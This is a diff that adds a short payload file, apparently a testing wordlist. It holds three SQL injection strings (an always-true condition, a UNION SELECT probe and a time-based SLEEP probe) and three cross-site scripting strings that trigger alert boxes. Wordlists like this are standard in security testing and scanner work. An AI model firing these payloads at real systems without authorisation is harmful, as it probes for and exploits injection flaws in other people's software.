@@ -1,0 +1,9 @@
+# SQL Injection Payloads
+1' OR '1'='1
+1' UNION SELECT null,null#
+1' AND SLEEP(3)#
+
+# XSS Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert('XSS')</script>
